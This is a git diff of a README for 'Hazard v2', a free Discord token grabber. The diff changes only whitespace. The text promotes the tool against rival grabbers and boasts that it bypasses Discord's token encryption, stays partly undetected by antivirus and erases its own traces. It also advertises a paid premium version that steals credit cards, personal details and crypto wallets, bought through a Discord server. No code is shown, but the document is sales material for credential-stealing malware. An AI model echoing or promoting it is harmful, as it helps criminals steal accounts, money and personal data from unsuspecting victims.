@@ -104,15 +104,17 @@ config = {
 ```
 
 ---
-  
+
 ## <a id="why_hazard"></a>🔎 〢 Why choose Hazard v2?
+
 You might be wondering, Why choose this grabber instead of other ones like [Mercurial](https://github.com/NightfallGT/Mercurial-Grabber) or [ItroublveTSC](https://github.com/Itroublve/ItroublveTSC). Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a [injection](https://github.com/Rdimo/Discord-Injection) which also currently is the only working one.
 
 Here are some pros and cons why/why not use Hazard v2 instead of other ones
-  
+
 ### ✔ Pros
+
 ⁃ Extremely well maintained, making it a safe choice \
-⁃ Partly undetected just because it gets updates often  \
+⁃ Partly undetected just because it gets updates often \
 ⁃ Free and easy to use/setup \
 ⁃ Loads of wide spread features not only focused on discord \
 ⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
@@ -120,16 +122,17 @@ Here are some pros and cons why/why not use Hazard v2 instead of other ones
 ⁃ Even thought it's made in python it's very fast thanks to async and threading \
 ⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited \
 ⁃ Takes feedback and listens to what people want to be added/changed/removed
-  
+
 ### ❌ Cons
+
 ⁃ Made in Python making it lose to other grabbers in terms of speed \
 ⁃ Python is an interpreted language, it needs to pack the engine & all dependencies in the binary making the file size very big \
 ⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)
-  
+
 In the end it's just up to **you** to choose what grabber suits you and your needs the best.
-  
+
 ---
-  
+
 ## <a id="enhancements"></a>🌟 〢 todo/enhancements
 
 ~~overlined~~ = on hold/not adding
@@ -146,7 +149,9 @@ In the end it's just up to **you** to choose what grabber suits you and your nee
 ---
 
 ## <a id="premium"></a>💎 〢 Premium
+
 Hazard v2 is a free software. It will **NOT** be undetected from antiviruses, or have custom features such as:
+
 - Stealing from more browsers (edge, firefox, brave, opera etc..)
 - Stealing creditcards, addresses, emails, phone numbers, names etc..
 - Crypto/Wallet stealing
@@ -160,7 +165,7 @@ Currently the premium grabber is not out yet, but the goal is that the premium o
 join [cheataway](https://cheataway.com/invite) and do `!buy` to see preview of the grabber, free trial will be available so you can try it out and see if you like it.
 
 ---
-                                                                           
+
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
